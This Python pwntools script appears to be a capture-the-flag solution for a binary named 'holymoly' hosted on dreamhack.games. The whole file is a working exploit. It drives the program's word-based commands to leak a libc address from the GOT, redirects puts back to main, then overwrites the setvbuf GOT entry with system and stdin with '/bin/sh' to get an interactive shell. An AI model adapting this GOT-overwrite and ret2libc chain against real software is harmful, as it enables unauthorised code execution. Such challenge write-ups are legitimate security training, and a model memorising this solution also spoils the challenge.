#!/usr/bin/env python3

from pwn import *

exe = ELF("./holymoly")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 14999)

    return r

def gen_value_payload(value):
    payload = b""
    for i in range(6):
        target_byte = (value >> (i * 8)) & 0xff
        upper_nibble = (target_byte >> 4) & 0xf
        lower_nibble = target_byte & 0xf

        payload += b"mystery"

        payload += b"monopoly" * upper_nibble
        payload += b"guacamole" * lower_nibble

        payload += b"cranberry"

        payload += b"broccoli" * upper_nibble
        payload += b"bordercollie" * lower_nibble

        payload += b"mystery"
        payload += b"guacamole"
    return payload

def main():
    r = conn()

    # leak got entry of setvbuf
    payload = b"mystery"
    payload += b"holymoly" * 1028
    payload += b"monopoly" * 4
    payload += b"blueberry"         

    # overwrite got entry of puts for ret2main        
    payload += b"broccoli" * 2
    payload += b"bordercollie" * 8
    payload += b"mystery"
    payload += b"holymoly" * 1025
    payload += b"rolypoly"
    payload += b"monopoly" * 15
    payload += b"guacamole" * 6
    payload += b"cranberry"
    payload += b"aaaaaaaa"

    r.sendlineafter(b"holymoly? ", payload)
    setvbuf = u64(r.recvn(8))
    
    libc.address = setvbuf - libc.symbols["setvbuf"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]

    # overwrite stdin with /bin/sh and got entry of setvbuf with system
    payload2 = b"mystery"
    payload2 += b"holymoly" * 1028
    payload2 += b"monopoly" * 9
    payload2 += gen_value_payload(binsh)
    payload2 += b"bordercollie" * 6
    payload2 += b"broccoli" * 5
    payload2 += gen_value_payload(system)
    payload2 += b"aaaaaaaa"

    r.sendlineafter(b"holymoly? ", payload2)
    r.interactive()

if __name__ == "__main__":
    main()
